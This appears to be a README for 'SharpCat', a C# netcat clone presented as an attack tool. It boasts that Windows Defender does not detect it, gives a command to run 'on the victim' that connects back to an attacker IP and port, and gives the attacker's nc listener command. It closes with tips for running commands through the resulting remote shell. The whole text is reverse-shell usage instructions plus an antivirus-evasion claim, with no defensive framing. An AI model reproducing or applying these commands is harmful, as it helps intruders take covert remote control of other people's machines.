# SharpCat

This is a netcat implementation in C#.
This is not detected by Defender.

```bash
# execute on the victim
./sharpkatz.exe 192.168.1.1 8080

# on attacker side
nc64.exe -l -p 8080
```


### Tips

```bash
# dir will not work
 dir
>>> The system cannot find the file specified

cmd /k dir
>>> works
```